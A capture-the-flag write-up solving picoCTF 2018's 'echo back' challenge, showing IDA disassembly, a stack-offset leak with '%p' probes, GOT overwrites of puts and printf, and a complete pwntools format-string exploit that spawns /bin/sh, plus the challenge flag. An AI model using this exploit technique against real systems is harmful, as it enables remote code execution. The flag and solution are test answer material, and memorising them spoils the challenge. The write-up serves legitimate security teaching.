> echo back - Points: 500 - (Solves: 73)
> This program we found seems to have a vulnerability. Can you get a shell and retreive the flag? Connect to it with nc 2018shell1.picoctf.com 22462.

Open the file in ida

They are using system to echo a message.
```
push    offset aEchoInputYourM ; "echo input your message:"
call    _system
```

There is also a format string vulnerability.
```
lea     eax, [ebp+var_8C]
push    eax
call    _printf
```

`[ebp+var_8C]` is a buffer we can write to which means we have control of the format string.


The address to aEchoInputYourM is at 0x08048720
```
.rodata:08048720 aEchoInputYourM
```

Address: `0x8048720`


Finding the location of our buffer:
```
% python -c "print 'AAAA' + '%p '*15" | nc 2018shell1.picoctf.com 22462
input your message:
AAAA0xffed915c 0x7f 0xf75e67bd 0xf7749a70 0x8048270 0x1 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070


Thanks for sending the message!
```

7th argument is the start of our stack: `%7$p`



Calculating return address location:
`0xffffd4f0 - 0xffffd59c = -172`
`172 / 4 = 43`

Return address is at `%43$p`


Our attack will work in 2 steps. We will overwrite the address 0x8048720 so that it contains our /bin/sh address and then we will overwrite the return address of vuln so that we can jump back to the correct location where system is called with /bin/sh as argument.

Scrape that...


Find the start of the got table:
`maintenance info sections`

Get the got address and check what is loaded to it.
```
gef➤  x 0x804a010+12
0x804a01c:      0x08048456
gef➤  x 0x08048456
0x8048456 <puts@plt+6>: 0x00002068
```

Puts got table address: `0x804a01c`


`set *0x804A01C=0x08048460`

1. Use the first overwrite to write a jump from puts to `0x080485E1` just after the `system` call
2. Use the second overwrite to write a jump from printf to system
3. Use the 3rd write to input /bin/sh into the buffer so that system will be called with /bin/sh

Exploit:
```
from pwn import *

c = connect("2018shell1.picoctf.com", 22462)

system_plt = 0x08048460

# GOT entries
puts = 0x804A01C
printf = 0x804A010

first_jmp = 0x080485E1

writes = {
    puts:first_jmp,
    printf:system_plt
}

c.sendline(fmtstr_payload(7,writes,0))
c.sendline("/bin/sh")
c.interactive()
```

Flag: `picoCTF{foRm4t_stRinGs_aRe_3xtra_DanGer0us_a9521c84}`
